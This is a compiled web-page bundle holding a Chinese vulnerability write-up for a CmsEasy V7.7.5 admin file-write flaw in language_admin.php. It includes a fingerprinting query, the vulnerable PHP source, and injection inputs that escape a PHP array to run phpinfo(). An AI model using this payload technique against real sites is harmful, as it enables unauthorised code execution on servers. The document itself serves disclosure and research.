import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as a}from"./app-58e4a7d6.js";const t={},l=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>CmsEasy 后台存在命令执行漏洞，通过文件 language_admin.php 对部分文件进行写入操作，导致任意文件写入</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CmsEasy V7.7.5_20210919
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;cmseasyedit&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181433140.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件为 <code>lib/admin/language_admin.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181434423.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function add_action() {
        $lang_choice=&#39;system.php&#39;;
        if (isset($_GET[&#39;lang_choice&#39;])){
            $lang_choice=$_GET[&#39;lang_choice&#39;];
        }
        if (front::post(&#39;submit&#39;)) {
            $langid=front::get(&#39;id&#39;);
            $lang=new lang();
            $langdata = $lang-&gt;getrows(&#39;id=&#39;.$langid, 1);
            if (is_array($langdata)){
                $langurlname=$langdata[0][&#39;langurlname&#39;];
            }else{
                front::alert(lang_admin(&#39;language_pack&#39;).lang_admin(&#39;nonentity&#39;));
            }
            $path=ROOT.&#39;/lang/&#39;.$langurlname.&#39;/&#39;.$lang_choice;
            $tipspath=ROOT.&#39;/lang/&#39;.$langurlname.&#39;/&#39;.$lang_choice;
            $content=file_get_contents($path);
            $tipscontent=file_get_contents($tipspath);
            $replace=&quot;&#39;&quot;.front::$post[&#39;key&#39;].&quot;&#39;=&gt;&#39;&quot;.front::$post[&#39;val&#39;].&quot;&#39;,&quot;;
            $tipsreplace=&quot;&#39;&quot;.front::$post[&#39;key&#39;].&quot;&#39;=&gt;&#39;&quot;.front::$post[&#39;cnnote&#39;].&quot;&#39;,&quot;;
            $content=str_replace(&#39;);&#39;,&quot;\\n&quot;.$replace.&#39;);&#39;,$content);
            file_put_contents($path,$content);
            $pos=strpos($tipscontent,$tipsreplace);
            if ($langurlname != &#39;cn&#39;&amp;&amp;$pos === false) {
                $tipscontent=str_replace(&#39;);&#39;,&quot;\\n&quot;.$tipsreplace.&#39;);&#39;,$tipscontent);
                file_put_contents($tipspath,$tipscontent);
            }
            if ($_GET[&#39;site&#39;] != &#39;default&#39;) {
                $ftp=new nobftp();
                $ftpconfig=config::get(&#39;website&#39;);
                $ftp-&gt;connect($ftpconfig[&#39;ftpip&#39;],$ftpconfig[&#39;ftpuser&#39;],$ftpconfig[&#39;ftppwd&#39;],$ftpconfig[&#39;ftpport&#39;]);
                $ftperror=$ftp-&gt;returnerror();
                if ($ftperror) {
                    exit($ftperror);
                }
                else {
                    $ftp-&gt;nobchdir($ftpconfig[&#39;ftppath&#39;]);
                    $ftp-&gt;nobput($ftpconfig[&#39;ftppath&#39;].&#39;/lang/&#39;.$langurlname.&#39;/&#39;.$lang_choice,$path);
                }
            }
            event::log(lang_admin(&#39;add_to&#39;).lang_admin(&#39;language_pack&#39;),lang_admin(&#39;success&#39;));
            //
            $shepi=&#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;&#39;.lang_admin(&#39;dosomething&#39;).lang_admin(&#39;complete&#39;).&#39;&quot;);gotoinurl(&quot;&#39;.url(&#39;language/edit/id/&#39;.$langdata[0][&#39;id&#39;],true);
            $shepi=$shepi.&#39;&amp;lang_choice=&#39;.$lang_choice;
            $shepi=$shepi.&#39;&quot;);&lt;/script&gt;&#39;;
            echo $shepi;
            //exit;
            //front::refresh(url(&#39;language/edit&#39;,true));
        }
        $this-&gt;view-&gt;lang_choice=$lang_choice;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>访问这个页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181434089.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中参数有三个，分别为 <code>key , cnnote, val</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181435903.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>传入参数后,查看 <code>lang/cn/system_custom.php</code> 文件中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
/*
 *中文语言包
 */

return

array(


&#39;2&#39;=&gt;&#39;3&#39;,);
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于没有对传入的参数进行过滤，通过写入特殊的参数就可以逃逸出数组造成命令执行</p><p>分别传入两次参数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test1  test2  test3);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>写入后文件内容</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
/*
 *中文语言包
 */

return

array(

&#39;test2&#39;=&gt;&#39;test3);&#39;,);
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>再传入一次参数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test4  ,test5, 	,phpinfo());/*
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181435729.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>写入后文件内容</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181435970.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问文件 <code>/lang/cn/system_custom.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181435144.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,29),s=[l];function d(c,r){return n(),i("div",null,s)}const o=e(t,[["render",d],["__file","CmsEasy language_admin.php 后台命令执行漏洞.html.vue"]]);export{o as default};
